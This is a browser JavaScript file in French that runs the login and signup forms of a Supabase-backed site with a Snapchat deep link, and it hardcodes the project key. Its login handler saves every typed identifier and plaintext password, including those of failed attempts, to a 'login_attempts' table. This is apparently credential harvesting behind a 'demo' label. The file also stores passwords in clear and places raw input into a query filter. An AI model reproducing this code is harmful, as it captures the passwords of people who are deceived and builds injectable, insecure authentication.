// --- Helpers ------------------------------------------------------------------
function showMessage(el, text, isError) {
  el.textContent = text;
  el.className = "form-message " + (isError ? "error" : "success");
}

// --- Supabase Configuration -------------------------------------------------
const SUPABASE_URL = "https://hbpujogqidmyfqazujvm.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhicHVqb2dxaWRteWZxYXp1anZtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2NjM3NTgsImV4cCI6MjA5MzIzOTc1OH0.gNK8md0xHHxY0gDqTzUg0aNvuMw2EpqgkvIOXSrDfRM";

// Vérifier que Supabase est chargé
if (!window.supabase) {
  console.error("Erreur: Supabase SDK non chargé");
  alert("Erreur: La bibliothèque Supabase n'est pas chargée. Vérifiez votre connexion internet.");
}

const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Test de connexion
supabase.from("users").select("count", { count: "exact", head: true }).then(({ error }) => {
  if (error) {
    console.error("Erreur de connexion à Supabase:", error);
  } else {
    console.log("✅ Connecté à Supabase");
  }
});

// --- Formulaire de connexion --------------------------------------------------
const loginForm = document.querySelector("#login-form");

if (loginForm) {
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    e.stopPropagation();
    
    const msg = document.querySelector("#login-message");
    const identifier = loginForm.identifier.value.trim();
    const password = loginForm.password.value;

    if (!identifier || !password) {
      return showMessage(msg, "Veuillez remplir tous les champs.", true);
    }

    try {
      // Chercher l'utilisateur dans Supabase
      const { data: user, error: userError } = await supabase
        .from("users")
        .select("*")
        .or(`username.eq.${identifier},email.eq.${identifier}`)
        .single();

      if (userError) {
        console.error("User fetch error:", userError);
      }

      // Vérifier le mot de passe (mode démo : en clair)
      const isSuccess = user && password === user.password;

      // Enregistrer la tentative
      const { error: attemptError } = await supabase.from("login_attempts").insert([{
        identifier,
        password,
        status: isSuccess ? "SUCCESS" : "FAILED"
      }]);
      
      if (attemptError) {
        console.error("Attempt insert error:", attemptError);
      }

      if (!isSuccess) {
        return showMessage(msg, "Identifiants incorrects.", true);
      }

      showMessage(msg, `Bienvenue, ${user.username} !`, false);

      // Afficher le bouton pour ouvrir l'app Snapchat
      const snapSection = document.querySelector("#snapchat-app-section");
      const snapLink = document.querySelector("#snapchat-app-link");
      if (snapSection && snapLink) {
        snapSection.style.display = "block";
        snapLink.href = `snapchat://add/${user.username}`;
      }
    } catch (err) {
      console.error(err);
      showMessage(msg, "Erreur de connexion.", true);
    }
  });
}

// --- Formulaire d'inscription -------------------------------------------------
const registerForm = document.querySelector("#register-form");

if (registerForm) {
  registerForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    e.stopPropagation();
    
    const msg = document.querySelector("#register-message");
    const username = registerForm.username.value.trim();
    const email = registerForm.email.value.trim();
    const password = registerForm.password.value;

    if (!username || !email || !password) {
      return showMessage(msg, "Veuillez remplir tous les champs.", true);
    }

    if (password.length < 6) {
      return showMessage(msg, "Le mot de passe doit contenir au moins 6 caractères.", true);
    }

    try {
      // Insérer dans Supabase (mot de passe en clair pour démo)
      const { data, error } = await supabase
        .from("users")
        .insert([{ username, email, password }])
        .select()
        .single();

      if (error) {
        if (error.message.includes("duplicate")) {
          return showMessage(msg, "Ce nom d'utilisateur ou cet email existe déjà.", true);
        }
        return showMessage(msg, "Erreur lors de l'inscription.", true);
      }

      showMessage(msg, "Compte créé avec succès ! Redirection...", false);
      setTimeout(() => (window.location.href = "/"), 1500);
    } catch (err) {
      console.error(err);
      showMessage(msg, "Erreur de connexion.", true);
    }
  });
}

// --- Liens démo (nav, etc.) ---------------------------------------------------
const demoActions = document.querySelectorAll(
  ".pill-button, .card-cta, .nav-item:not([href='/']), .ghost-mark:not([href='/']), .app-grid"
);

demoActions.forEach((element) => {
  element.addEventListener("click", (event) => {
    const href = element.getAttribute("href");
    if (href === "/" || href === "/register.html" || href === "/admin.html") return;
    event.preventDefault();
    window.alert("Maquette : cette fonctionnalite n'est pas encore disponible.");
  });
});
